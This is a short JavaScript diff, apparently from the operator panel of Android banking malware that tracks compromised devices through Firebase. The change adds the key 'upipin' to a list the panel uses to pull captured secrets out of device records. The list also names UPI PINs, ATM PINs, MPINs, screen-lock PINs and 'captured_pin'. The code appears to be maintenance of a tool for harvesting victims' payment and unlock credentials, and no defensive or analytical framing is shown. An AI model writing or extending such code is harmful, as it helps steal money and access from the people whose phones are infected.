@@ -505,7 +505,7 @@ function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(fireb
 function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
 function extractPinFromRecord(raw){
   if(!raw||typeof raw!=='object')return '';
-  var keys=['pin','PIN','device_pin','devicePin','mpin','MPIN','upi_pin','upiPin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
+  var keys=['pin','PIN','upipin','device_pin','devicePin','mpin','MPIN','upi_pin','upiPin','screen_pin','screenPin','lock_pin','lockPin','pin_code','pinCode','atm_pin','atmPin','captured_pin','capturedPin','upi_mpin','upiMpin'];
   var check=function(obj){
     if(!obj||typeof obj!=='object')return '';
     var i,v,s;
